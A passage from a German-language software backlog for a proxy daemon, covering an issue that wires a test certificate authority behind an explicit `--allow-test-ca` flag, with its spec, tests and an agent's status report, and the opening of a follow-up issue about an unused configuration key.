  Spezifikation schlug `openai_compatible (auth required)` vor — das wäre eine
  Behauptung über etwas Ungemessenes. Ein solcher Server steht jetzt als
  `unknown` mit dem Vermerk da und bleibt übernehmbar: Er hat geantwortet, und
  was dahinter steht, entscheidet ein Mensch mit einem Schlüssel.

Dazu kamen vier Punkte an der Oberfläche, alle aus demselben Grund: Die
Bewegung dieses Blattes lief an der Bewegungssprache des Hauses vorbei. Die
Zeilen fliegen jetzt **von oben** ein wie jede ankommende Zeile
(`HMotion.arriveOffset` über `HReducedMotion.distance`), die Kurve wird einmal
gebaut und entsorgt statt in jedem `build` neu, jede Zeile trägt einen
Schlüssel, das Blatt wächst mit `AnimatedSize` statt zu springen, und unter
reduzierter Bewegung läuft die Haarlinie gar nicht — eine Schleife ist genau
das, was diese Einstellung meint.

**Die Ankündigung ging am Menschen vorbei.** Sie lief über `render.detail`,
und das zeigt nur unter `-v`. Ein Ausgabeschalter darf nicht bestimmen, ob
jemand erfährt, dass sein Rechner gleich 1016 Verbindungen aufbaut; sie geht
jetzt wie bei `daemon install` direkt auf `stderr`.

**`LLM_008` ist neu.** Der Bereich `llm` hatte 001 bis 007 vergeben; die
Nummer 008 trägt jetzt „Die Suche im Netz kann nicht stattfinden" — drei Fälle
(keine Vorgaberoute, Tabelle nicht lesbar, Netz zu weit), die alle nichts über
einen gesuchten Server aussagen. `docs/DIAGNOSTICS.md` kommt aus dem Generator.

## HUM-087 · resolver.test_ca wirkt nicht
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-024, HUM-036, HUM-062 · Blockiert: keine

### Kontext
Der Schlüssel `resolver.test_ca` steht im Schema (`daemon/crates/config/src/model.rs:213`), in der Schema-Fixture (`daemon/crates/config/tests/fixtures/config.schema.json:496`), in der Schlüsselliste des Tests (`daemon/crates/config/tests/schema.rs:170`) und in der erzeugten Referenz (`docs/CONFIG.md:160`: „Zusätzliche CA für Tests. Nur in Testläufen setzen, nie im Alltag."). Er wird geladen, validiert, in der Stufe `expert` geführt und erscheint mit HUM-069 im Settings-Bildschirm. Gelesen wird er nirgends: `daemon/bin/humanitld/src/main.rs:488-489` meldet beim Start nur `resolver.test_ca is set but the daemon does not read it yet (HUM-024)`, und `main.rs:510` baut den Verbindungsstapel mit `ClientTls::new(&[], config.experimental.h2_upstream)`, also mit leerer Wurzelliste. Ein Schlüssel, der dokumentiert und validiert ist und nichts bewirkt, behauptet eine Fähigkeit, die es nicht gibt. Das ist der Bruch, der dieses Issue zu einem Fehler und nicht zu einer Wunschliste macht: `backlog/CONVENTIONS.md` 4.13 verlangt „Nie mehr behaupten als bewiesen ist", und Prinzip 8 in `BACKLOG.md` sagt zu, eine Konfigurationsquelle speise UI und CLI gleichermaßen.

Der Preis ist messbar. Weil keine fremde Wurzel gilt, fährt der M2-Demolauf über Klartext-HTTP (`tests/e2e/m2_first_decision/script.json`, Kommentarblock und die Schritt-URLs), und damit bleibt der TLS-Weg des Proxys — CONNECT, Blatt aus der eigenen CA, Handschlag zum Ziel, Fund im entschlüsselten Body — im einzigen vollständigen Lauf des Produkts unbelegt. Sechzehn der siebzehn Anfragen sind Klartext; die einzige verschlüsselte existiert, um zu scheitern. `backlog/CONVENTIONS.md` 4.22 hält das als verlorene Abdeckung fest, nicht als bloße Variante, und nennt dieses Issue als den Weg zurück.

Kein Regress und kein rotes Demoskript: Der Lauf ist grün, weil er die heutige Lage ausdrücklich als Zusicherung festhält. Schritt 7 („a test CA in the configuration is not trusted on its own") erwartet für `https://registry.npmjs.org/tls-probe` genau `502` und `error = upstream_tls`. Daneben stehen drei Vorkehrungen, die die Aussage ehrlich halten und beim Umdrehen mitwandern: ein Stolperdraht auf `humanitld --help`, der mit einer Anweisung stirbt, sobald das Flag da ist; das Auslesen der Warnzeile aus dem Daemon-Protokoll, damit die Behauptung vom Daemon stammt und nicht aus einem Ausbleiben; und eine positive Kontrolle über `/tls-control`, die mit derselben Wurzel gelingt und ohne sie scheitert. `tests/e2e/m2_first_decision/config.toml` und `backlog/CONVENTIONS.md` 4.22 nennen diese Richtung die sichere Seite. Es fehlt eine Fähigkeit, Schweregrad major. Das Flag `--allow-test-ca`, auf das Konfiguration, Zertifikatsskript und Konventionen zeigen, gibt es nirgends (`grep -rn "allow-test-ca" daemon/` liefert null Treffer); sein einziger Fundort in einer Spezifikation ist HUM-036 (`backlog/sprint-2.md:1635` und `:1653`). Die Warnung verweist auf HUM-024, dessen Spezifikation (`backlog/sprint-2.md` ab Zeile 371) weder den Schlüssel noch das Flag nennt; auch dieser Verweis geht ins Leere.

Die Fähigkeit selbst ist da: `ClientTls::new(extra_roots, h2)` nimmt zusätzliche Wurzeln entgegen (`daemon/crates/proxy/src/upstream.rs:86`) und wird in den Proxy-Tests so benutzt (`daemon/crates/proxy/tests/support/mod.rs:367`, Bauer-Methode `ProxyBuilder::trust`). Zu tun ist Verdrahtung, keine neue TLS-Logik.

### Ziel
`humanitld --allow-test-ca` liest `resolver.test_ca`, lädt die Datei als PEM und reicht die enthaltenen Zertifikate als zusätzliche Wurzeln an `ClientTls::new` weiter; ohne das Flag bleibt die Wurzelliste leer, und der gesetzte Schlüssel erzeugt einen Befund statt einer nackten Zeile im Log. Ein Flag mit unbrauchbarer Datei lässt den Daemon gar nicht erst starten. Der M2-Demolauf fährt danach über `https://` und dreht Schritt 7 um: Die Anfrage, die die Sitzungsregel erlaubt, erreicht das Ziel.

### Nicht-Ziel
Kein Eintrag in den System- oder Browser-Trust-Store und keine Änderung an der Humanitl-CA oder an dem, was in die Sandbox geht (`docs/SECURITY.md` 5). Keine Kopplung von Flag und Schlüssel im Config-Crate; es kennt die Kommandozeile nicht. Kein Flag, das mehrere Pfade oder ein Verzeichnis nimmt. Keine zweite Daemon-Instanz im Demolauf, nur um die Richtung ohne Flag noch einmal zu zeigen: Sie wird im Rust-Test gemessen, nicht im Skript.

### Betroffene Pfade
- `daemon/bin/humanitld/src/main.rs`: `--allow-test-ca` in `Cli` (65-99), Lader `test_ca_roots`, Warnung 488-489 ersetzen, Wurzeln durch `build_handler` (501-510) reichen
- `daemon/crates/ipc/src/server.rs`: `build_llm_probe` (1088-1112) und der zweite Stapel mit leerer Wurzelliste (1101)
- `daemon/crates/core-types/src/diagnostics/codes.rs`: `CONFIG_010`, `CONFIG_011`, `CONFIG_012` (gemeinsam genutzte Datei, nur anhängen)
- `tests/e2e/lib.sh`: `start_daemon` reicht Daemon-Argumente durch (geteilt mit M1)
- `tests/e2e/m2_first_decision/{run.sh,script.json,config.toml}`, `tests/e2e/fake-upstream/gen-test-ca.sh:17-24`
- `docs/CONFIG.md:160` und `docs/DIAGNOSTICS.md` (beide erzeugt, siehe Fallstricke), `docs/SECURITY.md` 5
- `daemon/crates/config/src/model.rs` (der Vermerk `x-pending-issue = "HUM-087"` an `resolver.test_ca` entfällt) und `daemon/crates/config/tests/config_readers.rs` (seine Registerzeile wechselt auf `effective`). Das Leser-Register aus HUM-101 führt den Schlüssel heute als `pending(HUM-087)`; sein Test vergleicht Register und Schema und wird rot, solange nur eine Seite nachgezogen ist
- `backlog/CONVENTIONS.md` 4.22 (Abschnitt über die Testwurzel), `backlog/sprint-2.md:1635` und `:1653`

### Spezifikation

Flag (Vorgabe aus, `expert`-Charakter im Hilfetext sichtbar):

```rust
/// Nimmt die Wurzel aus `resolver.test_ca` als zusätzlichen Vertrauensanker
/// für Verbindungen zum Ziel an. Nur für Testläufe.
#[arg(long)]
allow_test_ca: bool,
```

Lader in `main.rs`, damit die vier Fälle ohne laufenden Daemon prüfbar sind:

```rust
struct TestCa {
    roots: Vec<CertificateDer<'static>>,
    note: Option<Diagnostic>,
}

fn test_ca_roots(allow: bool, resolver: &ResolverConfig) -> Result<TestCa, Diagnostic>;
```

| Flag | `resolver.test_ca` | Ergebnis |
|---|---|---|
| aus | nicht gesetzt | `roots` leer, kein Befund; der Standardweg ist unverändert |
| aus | gesetzt | `roots` leer, `note` = `CONFIG_008` (Warning), `why`: „resolver.test_ca is set but the daemon was started without --allow-test-ca; the root is ignored", `fix`: `FixAction::CopyCommand("humanitld --allow-test-ca")` |
| an | nicht gesetzt | `roots` leer, `note` = `CONFIG_008` (Warning), `why` nennt die andere Hälfte: das Flag ohne Schlüssel bewirkt nichts |
| an | gesetzt, PEM mit mindestens einem Zertifikat | `roots` = alle gelesenen Zertifikate, kein Befund; der Start meldet `roots = <n>` und den Pfad auf `info` |
| an | gesetzt, Datei fehlt, unlesbar oder ohne Zertifikat | `Err(CONFIG_007)` (Error), `why` nennt Pfad und Ursache, `fix`: `FixAction::CopyCommand("openssl x509 -in <pfad> -noout -subject")`; der Daemon startet nicht |

Gelesen wird mit `CertificateDer::pem_slice_iter`, dem Muster aus `daemon/crates/proxy/src/ca.rs:512` und `:628`. Lehnt rustls eine Wurzel ab, kommt der Fehler bereits als `PROXY_003` mit „test CA is no trust anchor" aus `ClientTls::new` (`daemon/crates/proxy/src/upstream.rs:86-102`); dieser Fehler wird durchgereicht, nicht verschluckt.

Verdrahtung: `build_handler` bekommt einen Parameter `extra_roots: &[CertificateDer<'static>]` und gibt ihn an `ClientTls::new` weiter. Der zweite Stapel, die Endpunkt-Probe in `daemon/crates/ipc/src/server.rs:1101`, bekommt dieselben Wurzeln: Zwei verschiedene Vertrauensentscheidungen in einem Prozess wären genau die Überraschung, die dieses Repository vermeidet, und die Probe spricht mit demselben Netz wie der Proxy. Weil `IpcServer::new` neun Aufrufer hat, bleibt die Signatur, und die Wurzeln kommen über eine anhängende Methode:

```rust
/// Baut die Endpunkt-Probe mit zusätzlichen Wurzeln neu (`--allow-test-ca`).
pub fn with_extra_roots(self, roots: &[CertificateDer<'static>]) -> Self;
```

Demolauf: `start_daemon` in `tests/e2e/lib.sh` nimmt die Argumente des Daemons als weiteren Parameter entgegen (leer für M1), `run.sh` startet mit `--allow-test-ca`. Alle URLs in `script.json` gehen auf `https://`, ebenso `M2_URL_BLOCKED`, `M2_URL_ALLOWED` und `M2_URL_TIMEOUT` im Kopf von `run.sh`. Schritt 7 dreht sich um: `200` statt `502`, leeres `error`-Feld, und der Stolperdraht auf `humanitld --help` wird zu seinem Gegenteil — er muss das Flag jetzt finden. Die Gegenprobe in Schritt 9 zieht mit: `served` steigt von 16 auf 17, und aus „genau eine TLS-Anfrage, und zwar die Kontrolle" werden zwei, beide mit ihrem Pfad benannt. Die positive Kontrolle über `/tls-control` bleibt stehen; sie belegt weiterhin, dass das Material gültig ist, unabhängig davon, wem der Daemon vertraut. Die Zahlen in Schritt 8 bleiben, wie sie sind — die TLS-Anfrage zählt schon heute als `allow` und als eine der vierzehn erlaubten Anfragen an die Registry —, und `M2_EXPECTED_ASSERTIONS` wird am grünen Lauf nachgezogen.

Doku: `docs/CONFIG.md:160` nennt die Flagpflicht (über den Doc-Kommentar in `model.rs`, siehe Fallstricke). `docs/SECURITY.md` 5 bekommt einen Satz: Eine fremde Wurzel gilt nur für Verbindungen zum Ziel, nur mit `--allow-test-ca`, nie für die Sandbox und nie ohne ausdrücklichen Start. `backlog/CONVENTIONS.md` 4.22 wird von „gibt es nicht" auf die neue Lage umgeschrieben; `backlog/sprint-2.md:1635` und `:1653` werden auf den tatsächlichen Startbefehl angeglichen (kein `--config`; die Konfiguration findet der Daemon über den XDG-Baum des Laufs).

### Schritte
1. `test_ca_roots` samt `TestCa` schreiben, die fünf Zeilen der Tabelle als Unit-Tests in `main.rs`.
2. `CONFIG_010`, `CONFIG_011` und `CONFIG_012` ans Register anhängen, `docs/DIAGNOSTICS.md` erzeugen.
3. Flag in `Cli`, Warnung 488-489 entfernen, Befund in `run_daemon` protokollieren oder mit `Err` abbrechen; `build_handler` und `IpcServer::with_extra_roots` verdrahten.
4. Paar-Test im Proxy mit `UpstreamCa` und `ProxyBuilder::trust`.
5. Daemon-Test: Start mit Flag, ohne Flag und mit unbrauchbarer Datei.
6. `tests/e2e/lib.sh` um die Daemon-Argumente erweitern, M1 unverändert grün halten.
7. M2 auf `https://` stellen, Schritt 7 umdrehen, Zahlen in Schritt 9 und `M2_EXPECTED_ASSERTIONS` nachziehen, Lauf grün.
8. `docs/CONFIG.md` neu erzeugen, `docs/SECURITY.md`, `CONVENTIONS.md` 4.22, `sprint-2.md` und die Kommentare in `config.toml`, `script.json` und `gen-test-ca.sh` nachziehen.

### Tests
- `tests::test_ca_without_the_flag_is_ignored`, `tests::the_flag_without_the_key_says_so`, `tests::a_readable_test_ca_becomes_one_root`, `tests::an_unusable_test_ca_refuses_the_start` (alle in `daemon/bin/humanitld/src/main.rs`).
- `daemon/crates/proxy/tests/upstream_roots.rs`: dasselbe Blatt aus `UpstreamCa::new()`, einmal mit `ProxyBuilder::trust(root)`, einmal ohne.
- `daemon/bin/humanitld/tests/daemon_end_to_end.rs`: `a_test_ca_is_only_trusted_with_the_flag` (Log), `a_broken_test_ca_stops_the_start` (Exit-Code und fehlende Sockets).
- `tests/e2e/m2_first_decision/run.sh` Schritt 7, 9 und der Zähler am Ende.

### Akzeptanzkriterien
- [x] `test_ca_roots` erfüllt die fünf Zeilen der Tabelle: ohne Schlüssel leer und ohne Befund, Schlüssel ohne Flag leer mit genau einem `CONFIG_011`, Flag mit gültiger PEM genau eine Wurzel, Flag mit Datei ohne Zertifikat `Err` mit `CONFIG_010`.
- [x] `humanitld --allow-test-ca` mit gültiger Wurzel schreibt beim Start genau eine Zeile mit `roots=1` und dem Pfad; derselbe Baum ohne Flag schreibt `CONFIG_011` und keine Zeile mit `roots=`.
- [x] `humanitld --allow-test-ca` mit unlesbarer Datei endet mit Exit-Code ungleich 0, meldet `CONFIG_010` mit `why` und `fix`, und weder `daemon.sock` noch `proxy.sock` entstehen.
- [x] Paar-Test im Proxy: mit `trust(root)` antwortet der Proxy `200` und `upstream.hits() == 1`; ohne `trust(root)` antwortet er `502`, der Body enthält `reason: upstream_tls`, und `upstream.hits() == 0`.
- [x] `E2E_ONLY=m2 tests/e2e/run.sh` grün mit `https://` in `script.json`: Schritt 7 misst `200` für `https://registry.npmjs.org/tls-probe`, leeres `error`-Feld und `m2_upstream_hits '/tls-probe'` gleich 1; Schritt 9 zählt 16 bediente Anfragen.
- [x] `E2E_ONLY=m1 tests/e2e/run.sh` bleibt grün, und der M2-Lauf meldet weder „only N of M assertions ran" noch die Notiz über einen zu niedrigen `M2_EXPECTED_ASSERTIONS`.
- [x] `resolver.test_ca` hat einen Leser, und das Register sagt es: Die Zeile in `daemon/crates/config/tests/config_readers.rs` steht auf `effective`, der Vermerk `x-pending-issue` an `resolver.test_ca` ist weg, und `docs/CONFIG.md` zeigt in der Spalte „Wirkung" `ja` (HUM-101).
- [x] `make check` ist grün, ohne dass `docs/CONFIG.md`, `docs/DIAGNOSTICS.md` oder `config.schema.json` von Hand geändert wurden; `grep -rn "allow-test-ca" backlog/ docs/ tests/` beschreibt überall dieselbe, jetzt vorhandene Fähigkeit.

### Fallstricke
- `docs/CONFIG.md` und die Schema-Fixture sind erzeugt. Der Text zu `resolver.test_ca` ändert sich über den Doc-Kommentar in `daemon/crates/config/src/model.rs:212`, danach `UPDATE_CONFIG_DOCS=1 cargo test -p humanitl-config --test config_docs` und `UPDATE_SNAPSHOTS=1 cargo test -p humanitl-config --test schema`. Für das Code-Register `UPDATE_DIAG_DOCS=1 cargo test -p humanitl-core --test diag_docs`. Handarbeit an diesen drei Dateien macht `make check` rot.
- `codes.rs` ist eine gemeinsam genutzte Datei: unmittelbar vor dem Schreiben neu einlesen, nur anhängen, Bereich `CONFIG_001..009` (frei sind 007 bis 009).
- `tests/e2e/lib.sh` fährt beide Demos. Der neue Parameter von `start_daemon` muss vorne stehen bleiben, was M1 übergibt, sonst kippt der M1-Lauf mit.
- `M2_EXPECTED_ASSERTIONS=47` in `run.sh:76` wird exakt verglichen: zu wenige Behauptungen beenden den Lauf, zu viele erzeugen eine Notiz. Die Zahl gehört zu jeder Änderung an den Schritten dazu.
- Das Ziel des Laufs liegt in TEST-NET-2 im eigenen Netz-Namensraum, nicht auf `127.0.0.1`: Der Proxy weist private Adressen ab (`ip_is_private`, ADR-006, CONVENTIONS 4.22). Der Wechsel auf `https://` ändert daran nichts, und eine Vereinfachung auf Loopback bricht den Lauf.
- Das Flag ist standardmäßig aus und darf in keiner systemd-Unit, keinem Paket-Startbefehl und keiner Beispielkonfiguration auftauchen. Eine fremde Wurzel, die ohne Flag gälte, wäre ein Loch in `docs/SECURITY.md`.
- Die alte Warnung nennt HUM-024 als Grund; dieser Verweis ist falsch und verschwindet mit ihr, statt in den neuen Text übernommen zu werden.
- `backlog/sprint-2.md:1653` nennt zusätzlich `--config config.toml`, ein Flag, das `humanitld` ebenfalls nicht hat. Beim Angleichen wird geschrieben, was der Lauf tut, nicht was dort steht.
- Über `https://` läuft jede Anfrage des Demolaufs durch die TLS-Terminierung. Gruppierung, Funde und die Notiz im 403 werden am grünen Lauf nachgeprüft, nicht angenommen.

### Referenzen
BACKLOG.md Prinzip 3 und 8, ADR-006; `backlog/CONVENTIONS.md` 4.6, 4.13, 4.22; `docs/SECURITY.md` 5; `docs/CONFIG.md` `resolver.test_ca`; HUM-024, HUM-036, HUM-045; rustls `RootCertStore` (https://docs.rs/rustls/latest/rustls/struct.RootCertStore.html).

### Stand (2026-09-05): gebaut, beide Hälften, mit zwei Abweichungen

Gebaut ist der Daemon-Teil (Flag, Lader, Verdrahtung, Codes, Register,
Dokumente) und der Demolauf. Nicht angefasst wurde `daemon/crates/ipc/` und
`proto/`; die Arbeit lief parallel zu zwei anderen Agenten, und diese Pfade
gehörten ihnen. Was daraus folgt, steht unten unter „Zwei Abweichungen".

**Was es jetzt gibt.**

- `humanitld --allow-test-ca` (`daemon/bin/humanitld/src/main.rs`). Vorgabe
  aus. Der Hilfetext nennt den Zweck und sagt, dass ohne das Flag nichts gilt.
- `test_ca_roots(allow, resolver) -> Result<TestCa, Diagnostic>` mit den vier
  Fällen der Tabelle, dazu `announce_test_ca`, das den Befund und die Zeile
  mit `roots` und Pfad schreibt. Beide Zeilen auf Stufe `warn`.
- `humanitl_proxy::roots_from_pem(&[u8]) -> Vec<CertificateDer<'static>>`
  (`daemon/crates/proxy/src/upstream.rs`) liest die Datei als PEM, mit
  demselben `pem_slice_iter`-Muster wie `ca.rs`. Aufrufer: `test_ca_roots`.
- `build_handler` nimmt `extra_roots: &[CertificateDer<'static>]` und reicht
  sie an `ClientTls::new`. Die Endpunkt-Probe wird mit denselben Wurzeln neu
  gebaut (`probe_with_roots`) und über das schon vorhandene
  `IpcServer::with_llm_probe` angehängt — aber nur, wenn Wurzeln da sind; ohne
  Flag bleibt die Probe aus `IpcServer::new` unverändert stehen.
- `CONFIG_010` (Error, Testwurzel unbrauchbar), `CONFIG_011` (Warning, Flag ohne
  Schlüssel oder Schlüssel ohne Flag) und `CONFIG_012` (Error, Pfad nicht
  absolut) im Register, `docs/DIAGNOSTICS.md` erzeugt.
- **Der Pfad muss absolut sein.** Ein relativer würde gegen das
  Arbeitsverzeichnis des Starts aufgelöst, und das ist im Alltag das
  Projektverzeichnis: Das Flag entscheidet, **ob** eine fremde Wurzel gilt, der
  Pfad, **welche** — und den bestimmte dann teilweise das Projekt. Abgelehnt
  wird vor dem Lesen, mit `CONFIG_012` und einem `FixAction::ChangeSetting`,
  auch dann, wenn an der Stelle eine tadellose Wurzel liegt. Der Befund kam aus
  dem Review von Codex (2026-09-05); er war zutreffend und blockierend.
- **Jede Hälfte von `CONFIG_011` trägt ihren eigenen Fix.** Fehlt das Flag, ist
  der Weg hinaus der Befehl (`FixAction::CopyCommand`); fehlt der Schlüssel, ist
  es die Einstellung (`FixAction::ChangeSetting`). Vorher stand in beiden Fällen
  der Befehl, und wer das Flag gerade getippt hatte, las die Aufforderung, es zu
  tippen. Aus dem Review von Antigravity (2026-09-05), zutreffend.
- `resolver.test_ca` hat einen Leser: `x-pending-issue` ist weg, die
  Registerzeile steht auf `effective`, `docs/CONFIG.md` zeigt „ja".
- `docs/SECURITY.md` 5 hat einen eigenen Abschnitt: was das Flag tut, was es
  nicht tut, warum es ein Flag und kein Schlüssel ist, und woran ein Mensch von
  außen sieht, dass ein Daemon damit läuft.

**Zwei Abweichungen von der Spezifikation, beide notwendig.**

1. **Die Codenummern.** Die Spezifikation nennt `CONFIG_007` und `CONFIG_008`
   und sagt, 007 bis 009 seien frei. Sie sind es nicht mehr: HUM-066 hat sie
   für die Profile belegt (`codes.rs`, `CONFIG_007` bis `CONFIG_009`). Gebaut
   sind deshalb `CONFIG_010` und `CONFIG_011`; der Bereich `CONFIG` reicht bis
   019, die Notiz an `AREAS` ist nachgezogen.
2. **Die Endpunkt-Probe hängt anders am Server.** Die Spezifikation verlangt
   `IpcServer::with_extra_roots(&[CertificateDer])` in
   `daemon/crates/ipc/src/server.rs`. Diese Datei gehörte in dieser Sitzung
   einem anderen Agenten. Dasselbe Ergebnis entsteht ohne eine Zeile in `ipc`:
   `humanitld` baut die Probe selbst mit denselben Wurzeln und hängt sie über
   das schon vorhandene `IpcServer::with_llm_probe` an. Der Stapel ist
   derselbe wie in `build_llm_probe`, samt eigenem Resolver-Port; das ist
   Verdopplung von sechs Zeilen Verdrahtung und der Preis dafür, `ipc`
   unberührt zu lassen. Wer `with_extra_roots` später doch baut, ersetzt
   `probe_with_roots` durch den Aufruf und streicht die Verdopplung.

**Zwei weitere Stellen, an denen die Spezifikation ungenau ist.**

- Sie sagt, `resolver.test_ca` werde „validiert". Wird es nicht:
  `daemon/crates/config/src/validate.rs` kennt den Schlüssel nicht, er ist nur
  typisiert (`Option<PathBuf>`). Geprüft wird die Datei erst jetzt, und zwar
  im Daemon, mit Flag.
- Sie sagt, `humanitld` habe kein `--config`. Das stimmt; `backlog/sprint-2.md`
  ist entsprechend angeglichen.
- **Ihre Zahlen zum Demolauf stimmen zur Hälfte.** `served` steigt tatsächlich
  von 16 auf 17. Der Satz daneben, aus „genau eine TLS-Anfrage" würden „zwei",
  folgt aber nicht aus der eigenen Vorgabe, alle URLs auf `https://` zu stellen:
  Dann gehen fünfzehn Anfragen des Agenten und die Kontrolle über TLS, gemessen
  sechzehn, und im Klartext bleibt allein die Erreichbarkeits-Probe. Gebaut ist
  die gemessene Zahl.
- `M2_EXPECTED_ASSERTIONS` steht nicht bei `run.sh:76`, sondern bei `:110`, und
  trug 59, nicht 47; `backlog/sprint-2.md:2297` hatte das schon festgehalten.
  Der grüne Lauf ergibt 69.

**Wie der Normalfall unverändert blieb, nachgewiesen und nicht behauptet.**
`ClientTls::new` ist unverändert; ohne zusätzliche Wurzeln ist die
Wurzelmenge weiterhin genau `webpki-roots::TLS_SERVER_ROOTS`. Der Test
`a_test_root_changes_nothing_but_the_root_list`
(`daemon/crates/proxy/tests/upstream_roots.rs`) misst, dass eine zusätzliche
Wurzel das ALPN-Angebot in beiden Stellungen von `experimental.h2_upstream`
nicht verändert, und dass ohne Flag `http/1.1` allein angeboten wird. Die
Fehlerdiagnose bleibt `PROXY_003` aus derselben Zeile. Der Test
`no_connection_stack_of_this_binary_starts_with_an_empty_root_list` in
`main.rs` hält fest, dass dieses Binary genau zwei Verbindungsstapel baut und
keiner davon eine fest leere Wurzelliste bekommt.

**Sichtbarkeit nach außen, und was bewusst fehlt.** Sichtbar ist das Flag am
Prozess (`/proc/<pid>/cmdline`) und an der `WARN`-Zeile beim Start. Beides
setzt aber Zugriff auf die Maschine voraus, auf der der Daemon läuft: **Wer nur
seine Schnittstelle benutzt, sieht es nicht.** `GetInfo` trägt keine Fähigkeit
dafür, `humanitl daemon status` sagt nichts, und der Ereignisstrom trägt den
Befund des Starts nicht nach. Codex kommt im Review zum selben Schluss. Wohin
es gehört, ist `GetInfo.capabilities` und damit `humanitl daemon status`; dafür
braucht es `proto/` und `daemon/crates/ipc/`, beide in dieser Sitzung fremd.
Nicht dorthin gehört der Meta-Endpunkt `http://humanitl.internal/`: Den liest
der Agent in der Sandbox, dessen Vertrauen an der Humanitl-CA hängt und nicht
an dieser Wurzel; sein Format ist außerdem ein Vertrag mit dem
Terminal-Banner. Das ist hier verzeichnet und nirgends behauptet.

**Der Demolauf, umgestellt und gemessen.**

- `tests/e2e/lib.sh`: `start_daemon STATE_DIR XDG_DIR [HOLD_TIMEOUT_SECS]
  [ARG...]` reicht alles ab dem vierten Argument an `humanitld` weiter und
  merkt es in `DAEMON_ARGV`. Die ersten drei bleiben, wo sie waren; M1 ruft mit
  genau dreien auf und ist unberührt.
- `tests/e2e/m2_first_decision/run.sh` startet mit `--allow-test-ca`, alle
  siebzehn URLs in `script.json` stehen auf `https://`, ebenso `M2_URL_BLOCKED`,
  `M2_URL_ALLOWED` und `M2_URL_TIMEOUT`.
- **Der Stolperdraht ist umgedreht, nicht gestrichen.** Er sicherte zu, dass es
  das Flag nicht gibt; jetzt sichert er zu, dass dieser Lauf es benutzt: dass
  `humanitld --help` es kennt (sonst stirbt er mit der Anweisung, was
  zurückzudrehen wäre) und dass `DAEMON_ARGV` es trägt — also das, was wirklich
  an den Daemon ging, und nicht die Konstante im Skript.
- **Die Protokoll-Prüfung hat ihr Gegenstück bekommen.** Statt „der Daemon sagt,
  er ignoriert den Schlüssel" prüft der Lauf jetzt die Zeile, mit der der Daemon
  sagt, dass er die Wurzel geladen hat: `"roots":1`, den Pfad der Datei und die
  Stufe `WARN`, dazu dass weder `CONFIG_010` noch `CONFIG_011` im Protokoll
  steht.
- **Schritt 7 prüft den Inhalt, nicht nur den Status.** `200` allein könnte auch
  vom Proxy selbst kommen; geprüft werden `path` und `host` aus dem Rumpf, den
  der Agent gesehen hat, dazu der leere `error` des Flusses, seine Entscheidung
  `allow` und der Port des Ziels.
- Schritt 9 zählt neu: 17 bediente Anfragen (vorher 16), davon 16 über TLS und
  genau eine im Klartext (die Erreichbarkeits-Probe), und `/tls-probe` wie
  `/tls-control` je genau einmal.
- `M2_EXPECTED_ASSERTIONS` steht auf 69 (vorher 59), am grünen Lauf abgelesen.

**Gemessen, nicht angenommen.** `E2E_ONLY=m2 tests/e2e/run.sh` grün, 69
Behauptungen, Schritt 7 sieht `200` und den Rumpf des Ziels, das Ziel bedient
17 Anfragen. `E2E_ONLY=m1 tests/e2e/run.sh` bleibt grün.

**Was der Lauf weiterhin nicht sagt.** Die Richtung „ohne Flag gilt die Wurzel
nicht" misst er nicht; sie steht als Rust-Test in
`daemon/bin/humanitld/tests/daemon_end_to_end.rs`. Eine zweite Daemon-Instanz
nur dafür gehört nicht in das Demoskript (Nicht-Ziel dieses Issues). Über den
Bildschirm und den HAR-Export sagt er weiterhin nichts (HUM-097).

---

## HUM-088 · experimental.upstream_port_map wirkt nicht
Sprint: 3 · Größe: S · Abhängigkeiten: HUM-062 · Blockiert: HUM-076

### Kontext
`docs/CONFIG.md:80` sagt über `experimental.upstream_port_map`: „Lenkt einen Zielport auf einen anderen um, Schlüssel und Wert als Portnummer. Nur für Tests." Die Seite entsteht aus `daemon/crates/config/src/model.rs`, ist also keine Beschreibung neben dem Code, sondern der Code in Prosa. Umgelenkt wird trotzdem nichts. `grep -rn "port_map" --include="*.rs" daemon/` (ohne `target/`) trifft ausschließlich die Config-Kiste: Feld `daemon/crates/config/src/model.rs:452`, Prüfung `src/validate.rs:349`, Schema-Test `src/schema.rs:338`, dazu `tests/schema.rs:189` und `tests/precedence.rs:333`. In `daemon/crates/proxy/` und `daemon/bin/humanitld/` kommt der Name nicht vor. Der einzige gelesene Nachbar desselben Abschnitts ist `experimental.h2_upstream` in `daemon/bin/humanitld/src/main.rs:510`.

Das ist ein Fehler und nicht bloß eine Lücke, weil die Konfiguration sonst streng ist: Ein unbekannter Schlüssel in der Datei ist ein harter `CONFIG_002` (CONVENTIONS 4.11). Wer diesen Schlüssel setzt, bekommt deshalb kein „gibt es nicht", sondern Stille — und `experimental_is_well_formed` (`src/validate.rs:348`) prüft obendrein, dass die Schlüssel Portnummern sind. Ein Wert, der geprüft wird und dann nie gelesen wird, ist von außen nicht von einem wirksamen zu unterscheiden. CONVENTIONS 4.13 verlangt „Nie mehr behaupten als bewiesen ist"; für die Konfiguration gilt das wie für die Oberfläche. Für `resolver.test_ca` zieht der Daemon die Konsequenz und warnt beim Start (`daemon/bin/humanitld/src/main.rs:488-489`); für den Portschlüssel gibt es kein Gegenstück, obwohl `backlog/sprint-2.md:1690` genau das verlangt.

Die Lücke ist bereits zweimal festgehalten worden, ohne geschlossen zu werden: `backlog/CONVENTIONS.md` 4.22 (Zeile 1284) — „liest den Schlüssel `experimental.upstream_port_map` heute niemand — er steht im Schema, wird validiert und hat im Proxy keinen Aufrufer" — und `tests/e2e/m2_first_decision/run.sh:80`, das ausdrücklich daran vorbeifährt. Beide Testaufbauten, für die der Schlüssel gedacht war (HUM-024 in `backlog/sprint-2.md:439`, HUM-036 in `:1631`), stellen ihr Ziel auf `127.0.0.1:8443`; `ip_is_private` (ADR-006, angewendet in `daemon/crates/proxy/src/upstream.rs:213`) weist jede aufgelöste Adresse aus einem privaten Bereich ab, solange die Regel nicht `allow_private: true` setzt, und `127.0.0.1` ist eine — unabhängig vom Port. Der Schlüssel hätte die beiden Aufbauten also auch dann nicht lauffähig gemacht. HUM-024 ist ohne ihn fertig geworden: `pinned_addr_used` (`daemon/crates/proxy/tests/dns_after_allow.rs:274`) setzt stattdessen den echten flüchtigen Port in die Host-Kopfzeile. Kein ausgelieferter Test braucht den Schlüssel.

`Experimental` kündigt seinen eigenen Abbau an (`src/model.rs:71`, `docs/CONFIG.md:75`: „Schalter für unfertige Wege. Alles hier darf ohne Ankündigung wegfallen."). Ein Schalter, der nie einen Weg geschaltet hat, fällt deshalb weg, statt nachträglich einen zu bekommen.

### Ziel
